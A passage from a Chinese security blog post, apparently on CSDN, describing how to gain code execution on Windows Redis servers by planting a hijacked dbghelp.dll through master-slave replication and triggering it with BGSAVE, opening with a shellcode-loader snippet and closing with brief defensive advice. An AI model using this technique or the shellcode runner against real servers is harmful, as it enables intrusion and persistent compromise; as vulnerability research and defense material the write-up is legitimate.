memcpy(p, shellcode, sizeof(shellcode));
CODE code = (CODE)p;
code();
123
```

也需要使用类似创建进程或者注入进程的方式来操作，不要让DLL加载卡住。

#### 低权限 场景直接触发

借助其他服务来进行利用，相对来说还是比较被动，所以后续我主要去关注了redis本身，会不会在某些情况存在Dll劫持的问题。还有一点，高权限启动redis的情况有，但是最好还是能在低权限下能做一些事情。

所以我将环境默认安装， `Redis Service` 会开机自启，权限为 `Network Service` 。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/43a9bbf5f01313ac77c4d31e9ecab5c7.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135900-159b9afc-dd2a-1.jpg)

那么单纯的 Redis shell 能做的并不多，我们可以尝试使用一些命令来观察执行过程。

命令比较多，所以我们主要关注 Server端的指令。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/fb66ea57a81a5fca3415ab5382526ecc.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135901-15ec811a-dd2a-1.jpg)

在测试的过程中，我发现在使用 SYNC 命令时，发生了DLL 劫持的特征。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/c35a20d37e6096ea20e78c7347fae449.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135901-16152444-dd2a-1.jpg)

可以发现，不止出现了一个DLL 未找到。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/93baf899a3fa1092a0978b1159ce1826.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135902-1649f76e-dd2a-1.jpg)

放宽限制我们来细看一下。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/07fec9f64b6c095577e8000c34c196b7.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135902-1686d67a-dd2a-1.jpg)  
这里可以发现系统其实还去查询了 SafeDllSearchMode key值，但是因为从 Windows 7之后就采用KnownDLLs机制所以提示这个键值也是找不到的，但是并不影响DLL查找顺序。

1. 进程对应的应用程序所在目录（可理解为程序安装目录比如 `C:\ProgramFile\xxx` ）；
2. 系统目录（即 `%windir%system32` ）；
3. 16位系统目录（即 `%windir%system` ）；
4. Windows目录（即 `%windir%` ）；
5. 当前目录（运行的某个文件所在目录，比如 `C:\Documents and Settings\Administrator\Desktop\xxx`)
6. PATH环境变量中的各个目录；

所以根据规则， `dbghelp.dll` 不在 `KnownDLLs List` 中，会先从安装目录下搜索，即使System32下已经存在了 `dbghelp.dll` 。

另外一个很幸运的事情是，默认的安装目录， `Network Service` 用户是拥有完全控制权限的。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/5a32652bff6aca953a25bfad288e7b88.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135903-16dc0b40-dd2a-1.jpg)

在利用的时候安装目录如何得知了？其实通过 info 就可以看到。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/3be612e6fa3756b69067acec970c849d.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135903-1725b844-dd2a-1.jpg)

因为权限问题，这里我们就不考虑 `symsrv.dll`,因为他是需要在 System32 目录下进行劫持，接下去我们来看看 SYNC 命令。

[![img](https://i-blog.csdnimg.cn/blog_migrate/dbb363bbf3cadb2a706b429a3c29c30e.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135903-17545622-dd2a-1.jpg)

熟悉主从复制的同学对 SYNC 命令并不会陌生，它主要是让从服务器同步 Master的数据，在2.8版本之后加入PSYNC 为了代替SYNC，场景是为了解决断线重连之后的全量复制低效的缺陷，同样PYSNC也是会产生 `NAME NOT FOUNT` 。

> 图来自 https://juejin.im/post/6844903943764443149#heading-1  
> [![img](https://i-blog.csdnimg.cn/blog_migrate/0218dc96ea4a37dce7569970c7790615.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135904-17824fdc-dd2a-1.jpg)

从同步流程图可以看出来，slaveof host port 命令之后，其实就会去直接执行 sync的操作，并且SYNC之后还会开始执行BGSAVE的指令，并会fork一个子进程，然后创建RDB文件（一个压缩过的二进制文件，可以通过该文件还原快照时的数据库状态）进行持久化。

于是我尝试直接执行 `BGSAVE` 命令，发现也是直接触发了 `NAME NOT FOUNT` 。

[![img](https://i-blog.csdnimg.cn/blog_migrate/cfa4031f46d055796588aa65323c1597.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135904-17aefdac-dd2a-1.jpg)

后来发现与之相关的 `BGREWRITEAOF` 命令也会有同样的效果，其实可能还会有更多的命令会有这种效果，但并没有全部测试。有了刚才利用3389进行劫持的基础，现在来利用这个应该就比较简单了。

#### 再次利用

1. 通过 DLLHijacker.py 生成sln 项目，并修改原DLL地址，这里直接引用 System32 下的dbghelp.dll，就不需要再传一个了。
2. 将修改后劫持的DLL，通过主从复制传入 `C:\Program Files\Redis` 。
3. 连接redis, 执行bgsave。

可以看到执行了两次，并产生两个 calc 进程，这样就不需要被动等待DLL劫持带来的效果啦。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/1345262ab647c51d29c4e931dfbc61e5.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135905-184bfce2-dd2a-1.jpg)

在重启服务后，会自动加载此DLL，自动伴随持久化效果。  

文件已被加载，无法直接删除。  
[![img](https://i-blog.csdnimg.cn/blog_migrate/8a4a5031a7bd732314090789071a61ff.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200813135905-18a0f2e2-dd2a-1.jpg)

#### 总结&防御

- 另外关于 Redis DLL劫持这个利用点，可能还有利用一些 Windows 周期性自动运行的服务引发的DLL劫持，也可以作为利用的点，比如 wmiprvse、searchindexer等等吧，具体也没研究，听铁师傅说起过。
- 此利用还是依赖于写主从无损文件，所以内网利用可能问题不大，公网利用还是需要目标有出网的能力。
- 还需注意的是，不同操作系统版本的 `dbghelp.dll` 存在差异，在制作的时候，最好使用相同版本的dll进行劫持。

测试情况：

- Windows Server 2012 / Redis 3.2.100
- Windows 7 / Redis 3.0.504
- Windows Server 2008 / Redis 2.8.2103

其他版本还需要自行测试。

如果自己写的程序也存在此类问题？防御方面很多文章也写了，这里就直接引用一下吧。

> - 在加载 DLL 时尽量使用 DLL 的绝对路径
> - 调用 SetDllDirectory(L"") 把 当前目录 从 DLL 搜索目录中排除
> - 使用 LoadLibraryEx 加载 DLL 时，指定 LOAD\_LIBRARY *SEARCH* 系列标志
> - 可以尝试去验证 DLL 的合法性，例如是否具有自家的合法数字签名、是否是合法的系统 DLL 文件等

实付 元

[使用余额支付](https://blog.csdn.net/qq_26091745/article/details/)

点击重新获取

扫码支付

钱包余额 0

抵扣说明：

1.余额是钱包充值的虚拟货币，按照1:1的比例进行支付金额的抵扣。  
2.余额无法直接购买下载，可以购买VIP、付费专栏及课程。

[余额充值](https://i.csdn.net/#/wallet/balance/recharge)

举报

 [![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/Group.png) 点击体验  
DeepSeekR1满血版](https://ai.csdn.net/?utm_source=cknow_pc_blogdetail&spm=1001.2101.3001.10583) 隐藏侧栏 ![程序员都在用的中文IT技术交流社区](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_app.png)

程序员都在用的中文IT技术交流社区

![专业的中文 IT 技术社区，与千万技术人共成长](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_wechat.png)

专业的中文 IT 技术社区，与千万技术人共成长

![关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_video.png)

关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！

客服 返回顶部

![](https://i-blog.csdnimg.cn/blog_migrate/ed1fd1e61bf4b421fc327539a168b618.png) ![](https://i-blog.csdnimg.cn/blog_migrate/4c18415c68b26f38fdf4e2c42d84b6c7.png) ![](https://i-blog.csdnimg.cn/blog_migrate/dc7582a8be52a337343a1badba28911e.png) ![](https://i-blog.csdnimg.cn/blog_migrate/6049664b63c16146521ff640b3237472.png) ![](https://i-blog.csdnimg.cn/blog_migrate/ffd147f6d26dff077ad26d81c8d431a3.png) ![](https://i-blog.csdnimg.cn/blog_migrate/e6bb6f3c56c4ac5647c5bff238c30180.png) ![](https://i-blog.csdnimg.cn/blog_migrate/d5f0276dd21b264ce0962cd82fb4ef38.png) ![](https://i-blog.csdnimg.cn/blog_migrate/e33b24a670ee29df97d37cf47744f33e.png) ![](https://i-blog.csdnimg.cn/blog_migrate/dfc9d5fca207b4e2c7910ebcffc0ce16.png) ![](https://i-blog.csdnimg.cn/blog_migrate/9fcb5a0839fbd2a3fc93dfa123c935cc.png) ![](https://i-blog.csdnimg.cn/blog_migrate/46fce243daed8d9b1eac6a8dabacd9e2.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/c9576cc86f320a216f640044e65c010f.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/5b03c264188a9be2011db3cda608f278.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/de47408ef6e957c365a9a948d4f4b92b.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/4bff97ac0f4f4ba5c0d330db74b24eaa.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/3a90d5326ee601bfb41880eaa3c1cd93.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/db0933353238c8561db7928e070c1f4b.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/081432aea6f0a88bfcc96fe14974dbef.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/15b9ebc85a6160dabcc5b8c214aea2da.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/9ac3b62be89b54637caf3416a82a862b.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/0a89e515be78b771e68154d13396fdbf.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/2d4cfa2c3d4cb6a839e4850959035914.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/c31326bbfe58970b64c08751bcc5f34d.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/2006d96cb0237b566c03370b4816b112.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/d428e8f451bd27df0b4437b963958f0d.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/1218f1561fa8e372911983206e9cae98.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/3394879a4fad5d52323dc246eaf73a96.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/40a5d9245e097c864cec2fcde95b3998.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/a643ee171d0b62d9b02dd6b0186b3b75.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/a416fa073ce7f8a4ac47cc151e482318.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/be98f0aefe8fe413f06f57e3cdfcb669.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/97aff6a85096c69a095693f5b17503cd.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/d4c37a7dfad143635d470dfe0fe382dc.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/e092d8fa3db3991a5b78e589b525eef6.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/429b36dcfcc8012783226ca709b2fe12.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/aec4dc9189200520ed13726596a09e0d.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/43a9bbf5f01313ac77c4d31e9ecab5c7.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/fb66ea57a81a5fca3415ab5382526ecc.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/c35a20d37e6096ea20e78c7347fae449.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/93baf899a3fa1092a0978b1159ce1826.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/07fec9f64b6c095577e8000c34c196b7.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/5a32652bff6aca953a25bfad288e7b88.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/3be612e6fa3756b69067acec970c849d.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/dbb363bbf3cadb2a706b429a3c29c30e.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/0218dc96ea4a37dce7569970c7790615.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/cfa4031f46d055796588aa65323c1597.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/1345262ab647c51d29c4e931dfbc61e5.jpeg) ![](https://i-blog.csdnimg.cn/blog_migrate/8a4a5031a7bd732314090789071a61ff.jpeg)